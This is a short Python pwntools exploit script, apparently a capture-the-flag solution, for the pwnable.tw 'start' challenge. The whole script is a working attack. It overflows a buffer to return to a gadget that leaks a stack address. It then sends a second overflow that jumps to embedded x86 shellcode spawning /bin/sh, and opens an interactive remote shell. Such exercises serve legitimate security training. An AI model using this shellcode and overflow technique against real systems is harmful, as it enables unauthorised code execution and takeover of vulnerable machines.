#!/bin/bash
# coding = utf-8
# author = Mr.BeanX
# date = 2018-5-27

from pwn import *

host = 'chall.pwnable.tw'
port = 10000

gadget = 0x8048087
shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'

def exp():
	p = remote(host,port)
	print p.recv()
	p.send('A'*20+p32(gadget))
	leak_stack = u32(p.recv(4))
	print 'stack addr: '+hex(leak_stack)

	payload = 'A'*0x14+p32(leak_stack+0x14)+shellcode
	p.send(payload)
	p.interactive('\nshell: ')

exp()
